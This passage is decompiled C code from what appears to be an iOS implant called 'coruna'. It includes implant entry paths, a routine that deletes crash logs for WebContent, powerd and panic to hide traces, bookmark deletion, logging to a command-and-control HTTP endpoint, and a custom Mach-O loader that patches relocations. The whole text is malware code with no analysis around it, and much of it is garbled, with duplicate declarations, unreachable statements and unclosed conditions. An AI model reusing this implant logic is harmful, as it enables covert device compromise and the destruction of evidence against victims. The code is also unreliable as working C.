    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
  if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
    (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
  }
  return type_id_10;
}





uint64_t coruna_implant_via_msu_mnt1_path(long handle,long addr_2)
{
  bool err;
  uint64_t u;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    scratch = 0;
    u = coruna_msu_mnt1_path(&scratch);
    if ((int)u == 0x7003) {
      err = false;
      *(uint32_t *)(addr_2 + 4) = 0x15180;
    }
    else {
      if ((int)u != 0) {
        return u;
      }
      *(uint32_t *)(addr_2 + 4) = *(uint32_t *)(scratch + 8);
      err = *(char *)(scratch + 5) != '\0';
    }
    u = 0;
    *(bool *)addr_2 = err;
  }
  return u;
}





uint8_t *
uint64_t * coruna_implant_residual_39(int64_t arg,uint64_t val,char *path,uint64_t *id_2,int64_t *arg)
{
  uint8_t *ptr;
  long scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  
  ptr = (uint8_t *)0xad001;
  if (((arg != 0) && (path != (char *)0x0)) &&
     ((*path != '\0' && id_2 != (uint64_t *)0x0) && arg != (long *)0x0)) {
    host_info = 0;
    thread_attr = 0;
    ptr = (uint8_t *)(**(void (**)(arg + 0x68))(arg,val,&host_info,&thread_attr);
    if ((int)ptr == 0) {
      bootargs = 0;
      ptr = (uint8_t *)(**(void (**)(arg + 0x50))(arg,host_info,thread_attr,&bootargs);
      if ((int)ptr == 0) {
        scratch = 0;
        ptr = (uint8_t *)(**(void (**)(arg + 0x58))(arg,bootargs,path,&scratch);
        if ((int)ptr == 0) {
          if (scratch != 0) {
            *id_2 = bootargs;
            *arg = scratch;
            return (uint8_t *)0x0;
          }
          ptr = &UNK_00004003;
        }
        (**(void (**)(arg + 0x60))(arg,bootargs);
      }
    }
  }
  return ptr;
}





uint64_t coruna_msu_mnt1_path(uint64_t *val,long handle)
{
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (handle != 0)) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        u = 0xad001;
      }
      else {
        u = 0xad001;
        if (((scratch != 0) && (u = 0xad014, 0x17 < scratch)) && (*bootargs == -0x21522ff1)) {
          u = 0;
          *val = bootargs;
        }
      }
    }
  }
  return u;
}





void coruna_cleanup_crash_paths(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  coruna_chmod_dir_walk(val,"com.apple.WebKit.WebContent",0,id_2);
  coruna_chmod_dir_walk(val,"powerd",0,id_2);
  coruna_chmod_dir_walk(val,"panic",0,id_2);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_unlink_recent_in_dir(val,id_2);
  return;
}





uint coruna_pthread_attr_setdetachstate(void **ctx,void *scratch)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  void *scratch;
  pthread_t bootargs;
  pthread_attr_t thread_attr;
  
  thread_attr.__opaque[0x20] = '\0';
  thread_attr.__opaque[0x21] = '\0';
  thread_attr.__opaque[0x22] = '\0';
  thread_attr.__opaque[0x23] = '\0';
  thread_attr.__opaque[0x24] = '\0';
  thread_attr.__opaque[0x25] = '\0';
  thread_attr.__opaque[0x26] = '\0';
  thread_attr.__opaque[0x27] = '\0';
  thread_attr.__opaque[0x18] = '\0';
  thread_attr.__opaque[0x19] = '\0';
  thread_attr.__opaque[0x1a] = '\0';
  thread_attr.__opaque[0x1b] = '\0';
  thread_attr.__opaque[0x1c] = '\0';
  thread_attr.__opaque[0x1d] = '\0';
  thread_attr.__opaque[0x1e] = '\0';
  thread_attr.__opaque[0x1f] = '\0';
  thread_attr.__opaque[0x30] = '\0';
  thread_attr.__opaque[0x31] = '\0';
  thread_attr.__opaque[0x32] = '\0';
  thread_attr.__opaque[0x33] = '\0';
  thread_attr.__opaque[0x34] = '\0';
  thread_attr.__opaque[0x35] = '\0';
  thread_attr.__opaque[0x36] = '\0';
  thread_attr.__opaque[0x37] = '\0';
  thread_attr.__opaque[0x28] = '\0';
  thread_attr.__opaque[0x29] = '\0';
  thread_attr.__opaque[0x2a] = '\0';
  thread_attr.__opaque[0x2b] = '\0';
  thread_attr.__opaque[0x2c] = '\0';
  thread_attr.__opaque[0x2d] = '\0';
  thread_attr.__opaque[0x2e] = '\0';
  thread_attr.__opaque[0x2f] = '\0';
  thread_attr.__opaque[0] = '\0';
  thread_attr.__opaque[1] = '\0';
  thread_attr.__opaque[2] = '\0';
  thread_attr.__opaque[3] = '\0';
  thread_attr.__opaque[4] = '\0';
  thread_attr.__opaque[5] = '\0';
  thread_attr.__opaque[6] = '\0';
  thread_attr.__opaque[7] = '\0';
  thread_attr.__sig = 0;
  thread_attr.__opaque[0x10] = '\0';
  thread_attr.__opaque[0x11] = '\0';
  thread_attr.__opaque[0x12] = '\0';
  thread_attr.__opaque[0x13] = '\0';
  thread_attr.__opaque[0x14] = '\0';
  thread_attr.__opaque[0x15] = '\0';
  thread_attr.__opaque[0x16] = '\0';
  thread_attr.__opaque[0x17] = '\0';
  thread_attr.__opaque[8] = '\0';
  thread_attr.__opaque[9] = '\0';
  thread_attr.__opaque[10] = '\0';
  thread_attr.__opaque[0xb] = '\0';
  thread_attr.__opaque[0xc] = '\0';
  thread_attr.__opaque[0xd] = '\0';
  thread_attr.__opaque[0xe] = '\0';
  thread_attr.__opaque[0xf] = '\0';
  bootargs = (pthread_t)0x0;
  if (ctx == (void **)0x0) {
    return 0xad001;
  }
  err = _pthread_attr_init(&thread_attr);
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    return u | 0x40000000;
  }
  err = _pthread_attr_setdetachstate(&thread_attr,1);
  if ((err == 0) && (err = _pthread_create(&bootargs,&thread_attr,ctx,scratch), err == 0)) {
    scratch = (void *)0x0;
    err = _pthread_join(bootargs,&scratch);
    if (err == 0) {
      u = (uint)scratch;
      _pthread_attr_destroy(&thread_attr);
      return u;
    }
  }
  err = ___error();
  err = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < err) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  _pthread_attr_destroy(&thread_attr);
  return u;
}





uint64_t coruna_webbookmarks_delete_wrapper(void)
{
  coruna_webbookmarks_delete();
  return 0;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  coruna_webbookmarks_delete();
  return 0;
}





uint64_t coruna_implant_via_cat(long handle,long addr_2,long off_3)
{
  uint u;
  uint64_t size;
  uint32_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  size = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if ((*(int *)(addr_2 + 0xd8) == 0x100000c) && (1 < *(uint *)(addr_2 + 0xdc))) {
      thread_attr = off_3;
      if ((off_3 != 0) ||
         (size = (**(void (**)(handle + 0x70))(handle,0,&thread_attr), (int)size == 0)) {
        scratch = *(uint32_t *)k_implant_mach_task_self_slot;
        bootargs = 0;
        size = (**(void (**)(handle + 0x78))(handle,thread_attr,0xc000001b,&scratch);
        if ((int)size == 0) {
          u = bootargs >> 0x18;
          bootargs = bootargs & 0xffffff00;
          if (k_implant_rodata_word_26a08 <= *(double *)k_implant_dyldversionnumber_slot) {
            bootargs = coruna_cat(1,(uint16_t)bootargs);
            bootargs = coruna_cat((char)u,(uint32_t)bootargs);
          }
          size = (**(void (**)(handle + 0x78))(handle,thread_attr,0x4000001b,&scratch);
        }
        if (off_3 == 0) {
          (**(void (**)(handle + 0x90))(handle,thread_attr);
        }
      }
    }
    else {
      size = 0;
    }
  }
  return size;
}





void coruna_log_msg(char *path,uint64_t val,uint64_t id_2)
{
  if ((((path != (char *)0x0) && (*path != '\0')) && (*(long *)(path + 0x10) != 0)) &&
     (*(long *)(path + 8) != 0)) {
    coruna_c2_http_json(*(long *)(path + 0x10),*(long *)(path + 8),val,0,id_2);
    return;
  }
  return;
}





long coruna_call_log_msg(uint64_t *val)
{
  int err;
  char *ptr;
  
  ptr = (char *)val[2];
  if ((ptr != (char *)0x0) && (*ptr != '\0')) {
    coruna_log_msg(ptr,0xcc10d,0x730c4d88);
  }
  err = (*(void (*)val[1])(*val);
  return (long)err;
}





uint8_t * coruna_init_libsystem(uint64_t *val,int *flags,uint size,uint64_t *id_2)
{
  unsigned long u;
  uint64_t *ptr;
  byte *ptr;
  uint *buf;
  uint *str;
  unsigned long *copy;
  unsigned long *data;
  unsigned long *obj;
  uint32_t size;
  char *ptr;
  ushort version;
  ushort port;
  uint tag;
  bool err;
  bool status;
  int err;
  uint kind;
  long *buf;
  unsigned long type_id;
  long handle;
  uint8_t *block;
  long *str;
  uint8_t *entry;
  void (*buf)(void);
  void (*str)(void);
  void (*copy)(void);
  void (*data)(void);
  void (*obj)(void);
  byte flags;
  uint type_id_8;
  uint type_id_9;
  uint32_t type_id_10;
  long *copy;
  uint *entry_9;
  uint *entry_10;
  int *err;
  byte *data;
  int *status;
  unsigned long *entry_11;
  long addr;
  long *obj;
  unsigned long *entry_12;
  unsigned long type_id_11;
  int *flags;
  unsigned long type_id_12;
  long off;
  uint type_id_13;
  long base;
  uint *entry_13;
  long ctx_val;
  uint8_t *entry_14;
  long serial;
  unsigned long type_id_14;
  int *count;
  byte *block;
  byte *entry;
  unsigned long type_id_15;
  uint64_t type_id_16;
  int *scratch;
  long *bootargs;
  unsigned long *thread_attr;
  long host_info [64];
  uint serial_buf;
  void (*action)(void);
  void (*block_ctx)(void);
  long stack_guard;
  void (*sa_saved)(void);
  uint *sa_new;
  long path_buf [3];
  unsigned long tmp_buf;
  long region [2];
  
  coruna_copy_bytes_cc70(host_info,0x208);
  if (val == (uint64_t *)0x0) {
    return &k_implant_rodata_word_12002;
  }
  if (((val[5] == 0 || id_2 == (uint64_t *)0x0) || flags == (int *)0x0) || size == 0)
  {
    return &k_implant_rodata_word_12002;
  }
  buf = (long *)coruna_implant_via_driver_copy_port_1918_2(val,0x120,0);
  if (buf == (long *)0x0) {
    return &k_implant_rodata_word_12002;
  }
  type_id_15 = (unsigned long)size;
  coruna_copy_bytes_cc70(buf,0x120);
  buf[0xd] = (long)flags;
  buf[0x14] = type_id_15;
  type_id_14 = val[2];
  if (type_id_14 == 0) {
    type_id_8 = 0xff;
  }
  else {
    err = (int *)(type_id_14 & 0xfffffffffffff000);
    do {
      count = err;
      err = count + -0x400;
    } while (*count != -0x1120531);
    type_id_8 = count[2] & 0xffffff;
  }
  bootargs = (long *)flags;
  if (*flags == -0x35014542 || *flags == -0x41450136) {
    type_id_9 = flags[1];
    if (type_id_9 == 0) {
fail:
      return &k_implant_rodata_word_12006;
    }
    bootargs = (long *)0x0;
    kind = 0;
    type_id_13 = 0;
    err = (int *)((long)flags + type_id_15);
    type_id_9 = (type_id_9 & 0xff00ff00) >> 8 | (type_id_9 & 0xff00ff) << 8;
    type_id_9 = type_id_9 >> 0x10 | type_id_9 << 0x10;
    if (type_id_9 < 2) {
      type_id_9 = 1;
    }
    type_id_15 = 0;
    do {
      type_id = coruna_nop_stub(0x14,kind);
      count = (int *)((long)flags + (type_id & 0xffffffff) + 8);
      if (count < flags || err <= count) {
        return &k_implant_rodata_word_12004;
      }
      if ((int *)((long)count + 0x13U) < flags || err <= (int *)((long)count + 0x13U)) {
        return &k_implant_rodata_word_12004;
      }
      tag = (count[2] & 0xff00ff00U) >> 8 | (count[2] & 0xff00ffU) << 8;
      tag = tag >> 0x10 | tag << 0x10;
      if (size <= tag) {
        return &k_implant_rodata_word_12005;
      }
      status = (int *)((long)flags + (unsigned long)tag);
      tag = (count[3] & 0xff00ff00U) >> 8 | (count[3] & 0xff00ffU) << 8;
      type_id = (unsigned long)(tag >> 0x10 | tag << 0x10);
      flags = (int *)((long)status + (type_id - 1));
      if (flags < flags || err <= flags) {
        return &k_implant_rodata_word_12005;
      }
      if ((*count == 0xc000001) &&
         (tag = (count[1] & 0xff00ff00U) >> 8,
         tag = (tag | (count[1] & 0xff0000U) << 8) >> 0x10 | tag << 0x10,
         tag <= type_id_8 && type_id_13 <= tag)) {
        type_id_15 = type_id;
        bootargs = (long *)status;
        type_id_13 = tag;
      }
      kind = kind + 1;
    } while (type_id_9 != kind);
    return &k_implant_rodata_word_12006;
    buf[0x14] = type_id_15;
    buf[0xd] = (long)bootargs;
  }
  if (type_id_15 < 0x20) {
    return (uint8_t *)0x13001;
  }
  if (*(int *)bootargs != -0x1120531) {
    return (uint8_t *)0x13002;
  }
  err = 0x13005;
  if (type_id_15 < (unsigned long)*(uint *)((long)bootargs + 0x14) + 0x20) {
    return (uint8_t *)0x13003;
  }
  if ((type_id_14 == 0) && (*(int *)((long)bootargs + 0xc) != 7)) {
done:
    return (uint8_t *)(unsigned long)(err + 1);
  }
  if (*(int *)((long)bootargs + 4) != 0x100000c) {
cleanup:
    return (uint8_t *)(unsigned long)(err - 1);
  }
  type_id_9 = *(uint *)((long)bootargs + 8) & 0xffffff;
  if (type_id_8 < type_id_9) {
    type_id_8 = 0x3005;
    return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
  }
  if (type_id_9 == 2) {
    flags = *(byte *)((long)buf + 0xac) | 0x40;
    *(byte *)((long)buf + 0xac) = flags;
  }
  else {
    if (type_id_9 < 2) {
      return (uint8_t *)0x13005;
    }
    flags = *(byte *)((long)buf + 0xac);
  }
  *(byte *)((long)buf + 0xac) = *(byte *)((long)bootargs + 0x18) >> 2 & 8 | flags & 0xf7;
  *buf = (long)bootargs;
  err = *(int *)((long)bootargs + 0x10);
  if (err == 0) {
    type_id_14 = 0;
    base = 0;
  }
  else {
    base = 0;
    type_id_14 = 0;
    err = (int *)((long)bootargs + 0x20);
    do {
      if (err < bootargs) {
        return (uint8_t *)0x14001;
      }
      if ((int *)((long)bootargs + type_id_15) <= err) {
        return (uint8_t *)0x14001;
      }
      if (*err == 0x19) {
        type_id = *(unsigned long *)(err + 8);
        if (CARRY8(type_id_14,type_id)) {
          return (uint8_t *)0x14002;
        }
        if ((*(long *)(err + 10) == 0) && (*(long *)(err + 0xc) != 0)) {
          if (base != 0) {
            return (uint8_t *)0x14003;
          }
          base = *(long *)(err + 6);
        }
        if (0xfffffffe < type_id) {
          type_id = 0;
        }
        type_id_14 = type_id + type_id_14;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  handle = coruna_implant_via_driver_copy_port_1918_2(val,type_id_14,1);
  if (handle == -1) {
    return (uint8_t *)0x14004;
  }
  buf[10] = base;
  buf[0xb] = handle;
  *(int *)(buf + 0x15) = (int)type_id_14;
  if ((val[0xba] != 0) && (val[0xbb] != 0)) {
    handle = val[0xba] + (handle - val[0xbb]);
  }
  buf[0xc] = handle;
  base = *buf;
  if (*(int *)(base + 0x10) != 0) {
    if (buf[0x14] < 0x21) {
      return (uint8_t *)0x14009;
    }
    type_id_8 = 0;
    err = (int *)(buf[0xd] + 0x20);
    do {
      err = *err;
      if (err < 0xf) {
        if (err < 2) {
          if (err == -0x7fffffde) {
skip:
            buf[4] = (long)err;
          }
          else if (err == -0x7fffffcc) {
            *(byte *)((long)buf + 0xac) = *(byte *)((long)buf + 0xac) | 0x40;
            buf[5] = (long)err;
          }
        }
        else if (err == 2) {
          buf[6] = (long)err;
        }
        else if (err == 0xd) {
          buf[3] = (long)err;
        }
      }
      else if (err < 0x1a) {
        if (err == 0xf) {
          flags = *(byte *)((long)buf + 0xac) | 0x10;
next:
          *(byte *)((long)buf + 0xac) = flags;
        }
        else if (err == 0x19) {
          count = err + 2;
          err = coruna_implant_residual_41(count,"__PAGEZERO");
          if (err != 0) {
            err = coruna_implant_residual_41(count,"__TEXT");
            if (err == 0) {
              err = false;
              status = true;
            }
            else {
              err = coruna_implant_residual_41(count,"__DATA");
              if (err == 0) {
                status = false;
                err = true;
              }
              else {
                err = coruna_implant_residual_41(count,"__LINKEDIT");
                if (err == 0) {
                  status = false;
                  err = false;
                  buf[1] = ((buf[0xb] - buf[10]) + *(long *)(err + 6)) -
                               *(long *)(err + 10);
                }
                else {
                  status = false;
                  err = false;
                }
              }
            }
            type_id_15 = buf[0xb];
            type_id_14 = *(unsigned long *)(err + 0xc);
            base = 0;
            if (type_id_14 != 0) {
              base = type_id_14 - 1;
            }
            if (type_id_15 != 0) {
              type_id = *(unsigned long *)(err + 8);
              if ((((-1 < (long)type_id) && (type_id_14 <= type_id)) &&
                  (handle = *(long *)(err + 10), -1 < handle)) && (handle < buf[0x14])) {
                type_id_12 = buf[0xd];
                type_id_11 = type_id_12 + handle + base;
                if ((((type_id_12 <= type_id_11) && (type_id_11 < type_id_12 + buf[0x14])) &&
                    ((type_id_11 = *(long *)(err + 6) + (type_id_15 - buf[10]), type_id_15 <= type_id_11 &&
                     ((type_id_11 < type_id_15 + *(uint *)(buf + 0x15) &&
                      (u = (type_id_11 - 1) + type_id, type_id_15 <= u)))))) &&
                   (u < type_id_15 + *(uint *)(buf + 0x15))) {
                  err = coruna_driver_copy_port_1918(val,type_id_11,type_id,3);
                  if (err == 0) {
                    coruna_dyld_cached_port_ptr(type_id_11,type_id_12 + handle,type_id_14);
                    coruna_copy_bytes_cc70(type_id_11 + type_id_14,type_id - type_id_14);
                    if (err[0x10] != 0) {
                      type_id_9 = 0;
                      do {
                        type_id_15 = coruna_nop_stub(0x50,type_id_9);
                        type_id_15 = (long)err + (type_id_15 & 0xffffffff) + 0x48;
                        if (type_id_15 < (unsigned long)buf[0xd] ||
                            (unsigned long)(buf[0xd] + buf[0x14]) <= type_id_15) {
                          return (uint8_t *)0x1400a;
                        }
                        if (*(char *)(type_id_15 + 0x40) == '\n') {
                          flags = *(byte *)((long)buf + 0xac) | 2;
retry:
                          *(byte *)((long)buf + 0xac) = flags;
                        }
                        else {
                          if (*(char *)(type_id_15 + 0x40) == '\t') {
                            flags = *(byte *)((long)buf + 0xac) | 1;
                            continue;
                          }
                          if (status) {
                            err = coruna_implant_residual_41(type_id_15,"__eh_frame");
                            if (err == 0) {
                              *(int *)(buf + 0x16) = (int)type_id_15 - (int)err;
                            }
                            else {
                              err = coruna_implant_residual_41(type_id_15,"__unwind_info");
                              if (err == 0) {
                                *(int *)((long)buf + 0xb4) = (int)type_id_15 - (int)err;
                              }
                              else {
                                err = coruna_implant_residual_41(type_id_15,"__x");
                                if (err == 0) {
                                  buf[0x1d] =
                                       (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                }
                                else {
                                  err = coruna_implant_residual_41(type_id_15,"__stubs");
                                  if (err == 0) {
                                    buf[0x1e] =
                                         (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                    buf[0x1f] = *(long *)(type_id_15 + 0x28);
                                  }
                                  else {
                                    err = coruna_implant_residual_41(type_id_15,"__auth_stubs");
                                    if (err == 0) {
                                      buf[0x20] =
                                           (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                      buf[0x21] = *(long *)(type_id_15 + 0x28);
                                    }
                                    else {
                                      err = coruna_implant_residual_41(type_id_15,"__objc_stubs");
                                      if (err == 0) {
                                        buf[0x22] =
                                             (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20)
                                        ;
                                        buf[0x23] = *(long *)(type_id_15 + 0x28);
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                          else if ((err) &&
                                  (err = coruna_implant_residual_41(type_id_15,"__internal"), err == 0)) {
                            flags = *(byte *)((long)buf + 0xac) | 0x20;
                            continue;
                          }
                        }
                        type_id_9 = type_id_9 + 1;
                      } while (type_id_9 < (uint)err[0x10]);
                    }
                    goto found;
                  }
                  err = 0x14007;
                  return (uint8_t *)(unsigned long)(err + 1);
                }
              }
              type_id_8 = 0x4007;
              return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
            }
            err = 0x14007;
            return (uint8_t *)(unsigned long)(err - 1);
          }
        }
      }
      else {
        if (err == 0x1a) {
          flags = *(byte *)((long)buf + 0xac) | 4;
          goto next;
        }
        if (err == 0x22) goto skip;
      }
found:
      type_id_8 = type_id_8 + 1;
      base = *buf;
      if (*(uint *)(base + 0x10) <= type_id_8) {
        err = (int *)buf[0xd];
        serial_buf = 0;
        if (*(uint *)(base + 0x10) == 0) goto nomem;
        if (buf[0x14] < 0x21) {
          return (uint8_t *)0x17001;
        }
        type_id_8 = 0;
        status = (int *)((long)err + buf[0x14]);
        count = err + 8;
        goto invalid;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      if (err < (int *)buf[0xd]) {
        return (uint8_t *)0x14009;
      }
      if ((int *)(buf[0xd] + buf[0x14]) <= err) {
        return (uint8_t *)0x14009;
      }
    } while( true );
  }
  serial_buf = 0;
nomem:
  thread_attr = (unsigned long *)(buf + 7);
  bootargs = buf + 0xf;
  handle = buf[5];
  if ((handle == 0) || (*(int *)(handle + 8) == 0)) {
    handle = buf[4];
    if ((handle == 0) || (*(int *)(handle + 0x10) == 0)) {
      block = (uint8_t *)0xad001;
      handle = buf[1];
      if ((((handle == 0) || (addr = buf[8], addr == 0)) ||
          (entry_13 = (uint *)buf[0xb], entry_13 == (uint *)0x0)) || (*thread_attr == 0)) {
        entry = (uint8_t *)0xad001;
        *id_2 = buf;
        return entry;
      }
      off = buf[0xc];
      ctx_val = buf[10];
      serial = coruna_implant_residual_44();
      if (*(uint *)(addr + 0x4c) != 0) {
        entry_9 = (uint *)(handle + (unsigned long)*(uint *)(addr + 0x48));
        str = entry_9 + (unsigned long)*(uint *)(addr + 0x4c) * 2;
        entry = (uint8_t *)0x1000;
        if (((str <= entry_9) || (entry_9 < entry_13)) ||
           (entry_10 = (uint *)((long)entry_13 + (unsigned long)*(uint *)(buf + 0x15)), entry_10 <= entry_9
           *id_2 = buf;
           return entry;
        entry = (uint8_t *)0x1000;
        if (((uint *)((long)str - 1U) < entry_13) || (entry_10 <= (uint *)((long)str - 1U)))
        *id_2 = buf;
        return entry;
        entry_14 = (uint8_t *)0x930002;
        do {
          type_id_8 = *entry_9;
          type_id_15 = (unsigned long)type_id_8;
          entry = entry_14;
          if ((int)type_id_8 < 0) {
            *id_2 = buf;
            return entry;
            type_id_15 = type_id_15 & 0xffffff;
exit_ok:
            buf = (uint *)(serial + type_id_15);
            entry = (uint8_t *)0x930001;
            *id_2 = buf;
            return entry;
            *(long *)buf = (off - ctx_val) + *(long *)buf;
          }
          else if ((entry_9[1] & 0xffffff) != 0) {
            buf = (uint *)(serial + type_id_15);
            entry = (uint8_t *)0x930001;
            *id_2 = buf;
            return entry;
            *id_2 = buf;
            return entry;
          }
          entry_9 = entry_9 + 2;
        } while (entry_9 < str);
      }
      sa_new = (uint *)0x0;
      type_id_8 = *(uint *)(addr + 0x44);
      if (0 < (int)type_id_8) {
        entry_9 = (uint *)(handle + (unsigned long)*(uint *)(addr + 0x40));
        if (entry_9 < entry_9 + (unsigned long)type_id_8 * 2) {
          entry = (uint8_t *)0x1000;
          if ((entry_9 < entry_13) ||
             (str = (uint *)((long)entry_13 + (unsigned long)*(uint *)(buf + 0x15)), str <= entry_9
             *id_2 = buf;
             return entry;
          entry_10 = (uint *)((long)(entry_9 + (unsigned long)type_id_8 * 2) + -1);
          if ((entry_10 >= entry_13 && entry_10 <= str) && (entry_10 < entry_13 || str != entry_10))
          {
            type_id_9 = *(uint *)(base + 0x18);
            base = coruna_implant_residual_44(buf);
            entry_13 = (uint *)0x0;
            type_id_15 = 0;
            entry_11 = (unsigned long *)0x0;
            do {
              entry = (uint8_t *)0x910002;
              *id_2 = buf;
              return entry;
              copy = (unsigned long *)(base + (int)entry_9[type_id_15 * 2]);
              handle = *thread_attr;
              type_id_14 = (unsigned long)entry_9[type_id_15 * 2 + 1] & 0xffffff;
              data = (unsigned long *)(handle + type_id_14 * 0x10);
              entry_12 = (unsigned long *)buf[0xb];
              obj = (unsigned long *)((long)entry_12 + (unsigned long)*(uint *)(buf + 0x15));
              status = copy < entry_12;
              if ((((status || obj <= copy) || data < entry_12) || obj < data) ||
                  (((!status && copy <= obj) && (status || obj != copy)) &&
                   entry_12 < data ||
                  ((!status && copy <= obj) && (status || obj != copy)) &&
                  *id_2 = buf;
                  return entry;
              type_id_11 = *copy;
              type_id = type_id_11;
              if ((type_id_9 >> 4 & 1) != 0) {
                addr = handle + type_id_14 * 0x10;
                if (((~*(byte *)(addr + 4) & 0xe) == 0) &&
                   ((*(ushort *)(addr + 6) >> 7 & 1) != 0)) {
                  handle = handle + type_id_14 * 0x10;
                  type_id_14 = type_id_11 - *(long *)(handle + 8);
                  type_id = type_id_14;
                  if (type_id_14 != 0) {
                    err = *(int *)(*buf + 0x10);
                    if (err == 0) {
parse_ok:
                      type_id = 0;
                    }
                    else {
                      flags = *(byte *)(handle + 5);
                      err = (int *)(buf[0xd] + 0x20);
                      kind = 1;
                      do {
                        if (*err == 0x19) {
                          if (((kind & 0xff) <= (uint)flags) &&
                             ((uint)flags < err[0x10] + (kind & 0xff))) {
                            err = (uint)flags - (kind & 0xff);
                            if ((type_id_11 < *(unsigned long *)(err + (long)err * 0x14 + 0x1a)) ||
                               (type_id = type_id_14,
                               *(long *)(err + (long)err * 0x14 + 0x1c) +
                               *(unsigned long *)(err + (long)err * 0x14 + 0x1a) <= type_id_11))
                            goto parse_ok;
                            break;
                          }
                          kind = kind + err[0x10];
                        }
                        err = (int *)((long)err + (unsigned long)(uint)err[1]);
                        err = err + -1;
                        type_id = 0;
                      } while (err != 0);
                    }
                  }
                }
                else {
                  type_id = type_id_11 - *(long *)(addr + 8);
                }
              }
              if ((data != entry_11) &&
                 (err = coruna_return_zero_ead4(buf,data,&sa_new,host_info,val),
                 entry_13 = sa_new, err == 0)) {
                entry = (uint8_t *)0x910001;
                *id_2 = buf;
                return entry;
              }
              if (((type_id_9 >> 4 & 1) == 0) || (*copy != (long)entry_13 + type_id)) {
                *copy = (long)entry_13 + type_id;
              }
              type_id_15 = type_id_15 + 1;
              entry_11 = data;
            } while (type_id_15 != type_id_8);
            goto load_ok;
          }
        }
        entry = (uint8_t *)0x1000;
        *id_2 = buf;
        return entry;
      }
load_ok:
      sa_new = (uint *)0x0;
      if ((((buf[0xd] != 0) && (buf[1] != 0)) && (base = buf[8], base != 0)) &&
         ((buf[0xb] != 0 && (*thread_attr != 0)))) {
        handle = *buf;
        if (*(int *)(handle + 0x10) == 0) {
          block = (uint8_t *)0x0;
        }
        else {
          type_id_8 = 0;
          scratch = (int *)(buf[0xd] + 0x20);
          base = buf[1] + (unsigned long)*(uint *)(base + 0x38);
          addr = buf[0xc];
          serial = buf[10];
          do {
            if (*scratch == 0x19) {
              err = scratch + 0x12;
              count = err + (unsigned long)(uint)scratch[0x10] * 0x14;
              if (count <= err) goto load_ok_15;
              entry = (uint8_t *)0x0;
              do {
                type_id_9 = err[0x10];
                kind = coruna_implant_residual_42(err[10]);
                block = entry;
                if ((type_id_9 & 0xfe) == 6 && kind != 0) {
                  type_id = (unsigned long)(uint)err[0x11];
                  type_id_15 = base + type_id * 4;
                  type_id_14 = buf[0xb];
                  block = (uint8_t *)0x910005;
                  if ((type_id_14 <= type_id_15 && type_id_15 < type_id_14 + *(uint *)(buf + 0x15)) &&
                     (type_id_15 = base + (unsigned long)((kind + err[0x11]) - 1) * 4,
                     type_id_14 <= type_id_15 && type_id_15 < type_id_14 + *(uint *)(buf + 0x15))) {
                    str = (long *)(*(long *)(err + 8) + (addr - serial));
                    type_id_15 = (unsigned long)kind;
                    do {
                      type_id_9 = *(uint *)(base + type_id * 4);
                      if (type_id_9 != 0x40000000) {
                        if (type_id_9 == 0x80000000) {
                          entry_13 = (uint *)(*str + (addr - serial));
load_ok_16:
                          *str = (long)entry_13;
                        }
                        else {
                          type_id_14 = *thread_attr + (unsigned long)type_id_9 * 0x10;
                          type_id_11 = buf[0xb];
                          if ((type_id_14 >= type_id_11 && type_id_14 <= type_id_11 + *(uint *)(buf + 0x15)) &&
                              (type_id_14 < type_id_11 || type_id_11 + *(uint *)(buf + 0x15) != type_id_14)) {
                            err = coruna_return_zero_ead4(buf,type_id_14,&sa_new,host_info,val);
                            entry_13 = sa_new;
                            if (err != 0) goto load_ok_16;
                            entry = (uint8_t *)0x910003;
                          }
                          else {
                            entry = (uint8_t *)0x910004;
                          }
                        }
                      }
                      str = str + 1;
                      type_id = (unsigned long)((int)type_id + 1);
                      type_id_15 = type_id_15 - 1;
                      block = entry;
                    } while (type_id_15 != 0);
                  }
                }
                err = err + 0x14;
                entry = block;
              } while (err < count);
              handle = *buf;
            }
            else {
load_ok_15:
              block = (uint8_t *)0x0;
            }
            scratch = (int *)((long)scratch + (unsigned long)(uint)scratch[1]);
            type_id_8 = type_id_8 + 1;
          } while (type_id_8 < *(uint *)(handle + 0x10) && (int)block == 0);
        }
      }
    }
    else {
      if ((*(byte *)((long)buf + 0xac) >> 6 & 1) == 0) {
        entry = (uint8_t *)0x930003;
        addr = buf[0xc];
        serial = buf[10];
        base = buf[1];
        type_id_8 = *(uint *)(handle + 8);
        type_id_9 = *(uint *)(handle + 0xc);
        str = (long *)coruna_implant_residual_43(0);
        if (str == (long *)0x0) {
load_ok_17:
          entry = (uint8_t *)0x930004;
          *id_2 = buf;
          return entry;
        }
        if (type_id_9 != 0) {
          addr = addr - serial;
